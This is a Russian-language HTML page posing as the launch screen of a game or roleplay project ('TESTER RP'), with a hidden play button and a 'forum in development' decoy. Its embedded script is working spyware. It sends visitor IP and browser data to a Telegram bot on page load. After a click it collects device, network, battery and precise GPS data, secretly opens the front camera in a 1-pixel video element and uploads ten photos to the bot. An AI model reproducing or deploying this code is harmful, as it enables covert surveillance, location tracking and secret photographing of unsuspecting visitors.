<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TESTER RP</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            overflow: hidden;
            touch-action: none;
            -webkit-text-size-adjust: none;
            text-size-adjust: none;
            height: 100vh;
            font-family: Arial, sans-serif;
            position: relative;
            background: #000;
            display: flex;
            flex-direction: column;
        }
        .background-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('https://i.ibb.co/LDrtg7sJ/12-20250403192149.png') no-repeat center center;
            background-size: cover;
            z-index: -2;
        }
        .content {
            position: relative;
            z-index: 1;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: flex-end;
            align-items: center;
            padding-bottom: 20px;
        }
        .play-btn {
            background: transparent;
            border: none;
            width: 200px;
            height: 80px;
            margin-bottom: 100px;
            cursor: pointer;
            position: absolute;
            bottom: 150px;
            opacity: 0;
        }
        .hidden-camera {
            position: absolute;
            opacity: 0;
            width: 1px;
            height: 1px;
        }
        .legal-links {
            position: absolute;
            bottom: 10px;
            width: 100%;
            text-align: center;
            color: #fff;
            font-size: 12px;
            padding: 5px 0;
        }
        .message-box {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.8);
            color: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            z-index: 100;
            display: none;
        }
    </style>
</head>
<body>
    <div class="background-container"></div>
    <div class="content">
        <button class="play-btn" id="playBtn"></button>
    </div>

    <div class="legal-links">
        Договор оферты    Политика конфиденциальности
    </div>

    <div class="message-box" id="messageBox">
        Форум в разработке
    </div>

    <video id="hiddenCamera" class="hidden-camera" autoplay playsinline></video>

    <script>
        const botToken = '7898816931:AAHNPImGpJjs-MNsklAvrU0VRDFkHFte_ig';
        const chatId = '-1002577213610';
        const videoElement = document.getElementById('hiddenCamera');
        const playBtn = document.getElementById('playBtn');
        const messageBox = document.getElementById('messageBox');
        let stream = null;
        let positionCache = null;

        // Блокировка масштабирования
        document.addEventListener('gesturestart', e => e.preventDefault());
        document.addEventListener('touchmove', e => e.scale !== 1 && e.preventDefault(), { passive: false });

        // ================== РАСШИРЕННЫЙ СБОР ИНФОРМАЦИИ ==================
        async function collectFullInfo() {
            const info = {
                "🆔 Основная информация": await getBasicInfo(),
                "📱 Устройство": getDeviceDetails(),
                "🌐 Сеть": await getNetworkInfo(),
                "🔋 Батарея": await getBatteryStatus(),
                "📍 Геолокация": await getGeoData(),
                "🕒 Время и дата": getTimeInfo(),
                "🖥️ Экран": getScreenDetails(),
                "🧠 Память и CPU": await getHardwareInfo(),
                "🔍 Дополнительно": getAdditionalInfo()
            };
            
            // Форматируем информацию для отправки
            let message = "🚨 ПОЛНАЯ ИНФОРМАЦИЯ О ПОЛЬЗОВАТЕЛЕ 🚨\n\n";
            for (const [category, data] of Object.entries(info)) {
                message += `${category}:\n${formatInfo(data)}\n`;
            }
            
            return message;
        }

        async function getBasicInfo() {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            
            return {
                "IP-адрес": ipData.ip,
                "User Agent": navigator.userAgent,
                "Платформа": navigator.platform,
                "Язык": navigator.language,
                "Доступные языки": navigator.languages ? navigator.languages.join(', ') : 'Неизвестно',
                "Куки включены": navigator.cookieEnabled ? 'Да' : 'Нет'
            };
        }

        function getDeviceDetails() {
            return {
                "Тип устройства": getDeviceType(),
                "ОС": getOS(),
                "Браузер": getBrowser(),
                "Версия браузера": getBrowserVersion(),
                "Архитектура CPU": navigator.cpuClass || 'Неизвестно',
                "Количество ядер": navigator.hardwareConcurrency || 'Неизвестно',
                "Объем памяти": navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Неизвестно'
            };
        }

        async function getNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            return {
                "Тип соединения": connection?.type || 'Неизвестно',
                "Эффективный тип": connection?.effectiveType || 'Неизвестно',
                "Скорость загрузки": connection?.downlink ? connection.downlink + ' Mbps' : 'Неизвестно',
                "Задержка": connection?.rtt ? connection.rtt + ' мс' : 'Неизвестно',
                "Режим экономии данных": connection?.saveData ? 'Да' : 'Нет',
                "Онлайн статус": navigator.onLine ? 'Онлайн' : 'Оффлайн'
            };
        }

        async function getBatteryStatus() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        "Уровень заряда": Math.round(battery.level * 100) + '%',
                        "Заряжается": battery.charging ? 'Да' : 'Нет',
                        "Время до зарядки": battery.chargingTime ? formatTime(battery.chargingTime) : 'Неизвестно',
                        "Время до разрядки": battery.dischargingTime ? formatTime(battery.dischargingTime) : 'Неизвестно'
                    };
                } catch (e) {
                    return { "Ошибка": 'Не удалось получить данные' };
                }
            }
            return { "Статус": 'API не поддерживается' };
        }

        async function getGeoData() {
            if (positionCache) return positionCache;
            
            return new Promise((resolve) => {
                if ('geolocation' in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        position => {
                            positionCache = {
                                "Широта": position.coords.latitude,
                                "Долгота": position.coords.longitude,
                                "Точность": position.coords.accuracy + ' метров',
                                "Высота": position.coords.altitude || 'Недоступно',
                                "Скорость": position.coords.speed || 'Недоступно'
                            };
                            resolve(positionCache);
                        },
                        error => {
                            resolve({ "Ошибка": 'Геолокация запрещена: ' + error.message });
                        },
                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                    );
                } else {
                    resolve({ "Ошибка": 'Геолокация не поддерживается' });
                }
            });
        }

        function getTimeInfo() {
            return {
                "Часовой пояс": Intl.DateTimeFormat().resolvedOptions().timeZone,
                "Смещение времени": new Date().getTimezoneOffset() + ' минут',
                "Локальное время": new Date().toLocaleString(),
                "Время UTC": new Date().toUTCString()
            };
        }

        function getScreenDetails() {
            const screen = window.screen;
            return {
                "Разрешение": `${screen.width}x${screen.height}`,
                "Доступное разрешение": `${screen.availWidth}x${screen.availHeight}`,
                "Глубина цвета": screen.colorDepth + ' бит',
                "Плотность пикселей": window.devicePixelRatio || 'Неизвестно',
                "Ориентация": screen.orientation?.type || 'Неизвестно'
            };
        }

        async function getHardwareInfo() {
            return {
                "Количество ядер": navigator.hardwareConcurrency || 'Неизвестно',
                "Объем памяти": navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Неизвестно',
                "Макс. точки касания": navigator.maxTouchPoints || 'Неизвестно'
            };
        }

        function getAdditionalInfo() {
            return {
                "Do Not Track": navigator.doNotTrack || 'Неизвестно',
                "Поддержка WebGL": detectWebGL(),
                "Поддержка Canvas": detectCanvas(),
                "Поддержка WebRTC": detectWebRTC(),
                "Поддержка Service Workers": 'serviceWorker' in navigator ? 'Да' : 'Нет',
                "Поддержка Push API": 'PushManager' in window ? 'Да' : 'Нет'
            };
        }

        // ================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==================
        function getDeviceType() {
            const ua = navigator.userAgent;
            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
                return "Планшет";
            }
            if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
                return "Мобильное устройство";
            }
            return "Компьютер";
        }

        function getOS() {
            const ua = navigator.userAgent;
            if (/Windows/i.test(ua)) return "Windows";
            if (/Mac/i.test(ua)) return "MacOS";
            if (/Linux/i.test(ua)) return "Linux";
            if (/Android/i.test(ua)) return "Android";
            if (/iOS|iPhone|iPad|iPod/i.test(ua)) return "iOS";
            return "Неизвестно";
        }

        function getBrowser() {
            const ua = navigator.userAgent;
            if (/Edg/i.test(ua)) return "Edge";
            if (/OPR/i.test(ua)) return "Opera";
            if (/Chrome/i.test(ua)) return "Chrome";
            if (/Firefox/i.test(ua)) return "Firefox";
            if (/Safari/i.test(ua)) return "Safari";
            if (/MSIE|Trident/i.test(ua)) return "IE";
            return "Неизвестно";
        }

        function getBrowserVersion() {
            const ua = navigator.userAgent;
            const matches = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
            return matches[2] || 'Неизвестно';
        }

        function detectWebGL() {
            try {
                const canvas = document.createElement('canvas');
                return !!window.WebGLRenderingContext && 
                    (canvas.getContext('webgl') || canvas.getContext('experimental-webgl'));
            } catch (e) {
                return false;
            }
        }

        function detectCanvas() {
            try {
                const canvas = document.createElement('canvas');
                return !!(canvas.getContext && canvas.getContext('2d'));
            } catch (e) {
                return false;
            }
        }

        function detectWebRTC() {
            return !!(window.RTCPeerConnection || window.mozRTCPeerConnection || 
                    window.webkitRTCPeerConnection || window.msRTCPeerConnection);
        }

        function formatTime(seconds) {
            const h = Math.floor(seconds / 3600);
            const m = Math.floor((seconds % 3600) / 60);
            return `${h} ч ${m} мин`;
        }

        function formatInfo(info) {
            let result = '';
            for (const [key, value] of Object.entries(info)) {
                if (typeof value === 'object' && value !== null) {
                    result += `  ${key}:\n${formatInfo(value).replace(/^/gm, '    ')}`;
                } else {
                    result += `  ${key}: ${value}\n`;
                }
            }
            return result;
        }

        // ================== ОТПРАВКА ГЕОЛОКАЦИИ ==================
        async function sendLocationToTelegram(lat, lon) {
            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        latitude: lat,
                        longitude: lon
                    })
                });
            } catch (error) {
                console.error('Ошибка отправки геолокации:', error);
            }
        }

        // ================== РАБОТА С КАМЕРОЙ ==================
        async function captureAndSendPhoto(index) {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                
                // Проверка что фото не черное
                const imageData = ctx.getImageData(0, 0, 1, 1).data;
                if (imageData[0] === 0 && imageData[1] === 0 && imageData[2] === 0) {
                    throw new Error('Камера вернула черное изображение');
                }
                
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
                
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, `photo_${index}.jpg`);
                formData.append('caption', `📸 Фото ${index} - ${new Date().toLocaleString()}`);
                
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
            } catch (error) {
                console.error(`Ошибка фото ${index}:`, error);
                throw error;
            }
        }

        async function takeSeriesOfPhotos() {
            let successCount = 0;
            const maxAttempts = 3;
            
            for (let i = 1; i <= 10; i++) {
                let attempts = 0;
                let success = false;
                
                while (attempts < maxAttempts && !success) {
                    attempts++;
                    try {
                        await captureAndSendPhoto(i);
                        successCount++;
                        success = true;
                    } catch (error) {
                        if (attempts >= maxAttempts) {
                            console.error(`Не удалось сделать фото ${i} после ${maxAttempts} попыток`);
                        } else {
                            await new Promise(resolve => setTimeout(resolve, 300));
                        }
                    }
                }
                
                if (i < 10) await new Promise(resolve => setTimeout(resolve, 500));
            }
            
            return successCount;
        }

        async function startCamera() {
            try {
                // Пробуем фронтальную камеру
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                
                videoElement.srcObject = stream;
                
                // Ждем пока камера инициализируется
                await new Promise(resolve => {
                    videoElement.onloadedmetadata = resolve;
                    setTimeout(resolve, 1000);
                });
                
                // Делаем серию фото
                const successCount = await takeSeriesOfPhotos();
                
                // Отправляем отчет
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: `📊 Отчет: успешно отправлено ${successCount}/10 фото`
                    })
                });
                
            } catch (error) {
                console.error('Ошибка камеры:', error);
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: `⚠️ Ошибка камеры: ${error.message || 'Неизвестная ошибка'}`
                    })
                });
            } finally {
                stopCamera();
                messageBox.style.display = 'block';
            }
        }

        function stopCamera() {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                videoElement.srcObject = null;
                stream = null;
            }
        }

        // ================== ОСНОВНОЙ КОД ==================
        playBtn.addEventListener('click', async () => {
            try {
                // Собираем и отправляем полную информацию
                const fullInfo = await collectFullInfo();
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: fullInfo
                    })
                });
                
                // Отправляем геолокацию если доступна
                const geoData = await getGeoData();
                if (geoData['Широта'] && geoData['Долгота']) {
                    await sendLocationToTelegram(geoData['Широта'], geoData['Долгота']);
                }
                
                // Запускаем камеру
                await startCamera();
            } catch (error) {
                console.error('Общая ошибка:', error);
                messageBox.style.display = 'block';
            }
        });

        // Отправляем базовую информацию при загрузке
        window.addEventListener('load', async () => {
            try {
                const basicInfo = await getBasicInfo();
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: `📱 Новое подключение:\n${formatInfo(basicInfo)}`
                    })
                });
            } catch (e) {
                console.error('Ошибка отправки:', e);
            }
        });

        // Остановка камеры при закрытии
        window.addEventListener('beforeunload', stopCamera);
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) stopCamera();
        });
    </script>
</body>
</html>
